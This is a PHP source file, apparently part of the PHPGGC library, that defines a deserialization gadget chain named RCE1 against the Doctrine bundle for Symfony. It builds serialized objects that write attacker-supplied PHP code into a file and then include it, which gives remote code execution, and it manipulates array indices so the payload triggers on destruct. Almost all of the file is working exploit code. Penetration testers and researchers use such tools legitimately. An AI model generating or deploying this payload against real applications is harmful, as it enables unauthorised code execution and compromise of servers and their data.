<?php

namespace GadgetChain\Doctrine;

use Doctrine\Common\Cache\Psr6\CacheAdapter;
use Doctrine\Common\Cache\Psr6\TypedCacheItem;
use Doctrine\Common\Cache\Psr6\CacheItem;
use Symfony\Component\Cache\Adapter\PhpArrayAdapter;
use Symfony\Component\Cache\Adapter\ProxyAdapter;
use Symfony\Component\HttpFoundation\Session\Storage\MockFileSessionStorage;
use Symfony\Component\HttpFoundation\Session\Storage\MetadataBag;


class RCE1 extends \PHPGGC\GadgetChain\RCE\PHPCode
{
    public static $version = '1.5.1 <= 2.7.2';
    public static $vector = '__destruct';
    public static $author = 'Remsio';
    public static $information = 
        'Based on package doctrine/doctrine-bundle, the Symfony bundle for doctrine.
        The chain is based on one chain to write, and on another one to include.
        Be careful, the POP chain differs depending on the PHP version';

    /**
     * Fast destruct implementation for both chains, mandatory to make sure the payload triggers correctly
     */
    public function process_serialized($serialized)
    {

        $find_write = (
            '#i:(' .
                1001 . '|' .
                (1001 + 1) .
            ');#'
        );
        $replace_write = 'i:' . 1000 . ';';
        $serialized2 = preg_replace($find_write, $replace_write, $serialized);
        $find_include = (
            '#i:(' .
                2001 . '|' .
                (2001 + 1) .
            ');#'
        );
        $replace_include = 'i:' . 2000 . ';';
        return preg_replace($find_include, $replace_include, $serialized2);
  	}

    public function generate(array $parameters)
    {
        $code = $parameters['code'];
        /* CacheItem is compatible with PHP 7.*, TypedCacheItem is compatible with PHP 8.* */
        if (preg_match('/^7/', phpversion()))
        {
            $firstCacheItem = new CacheItem();
            $secondCacheItem = new CacheItem();
        } 
        else 
        {
            $firstCacheItem = new TypedCacheItem();
            $secondCacheItem = new TypedCacheItem();
        }

        /* File write */
        $obj_write = new CacheAdapter();
        $mockFileSessionStorage = new MockFileSessionStorage();
        $mockFileSessionStorage->data = ['<?php '. $code. ' ?>']; // Content put in the file
        $mockFileSessionStorage->metadataBag = new MetadataBag();
        $obj_write->cache = $mockFileSessionStorage;
        $obj_write->deferredItems = [$firstCacheItem];
        
        /* File inclusion */
        $obj_include = new CacheAdapter();
        $obj_include->cache = new PhpArrayAdapter();
        $secondCacheItem->expiry = 0; // mandatory to go to another branch from CacheAdapter __destruct
        $obj_include->deferredItems = [$secondCacheItem];
        $obj = [1000 => $obj_write, 1001 => 1, 2000 => $obj_include, 2001 => 1];
        return $obj;
    }
}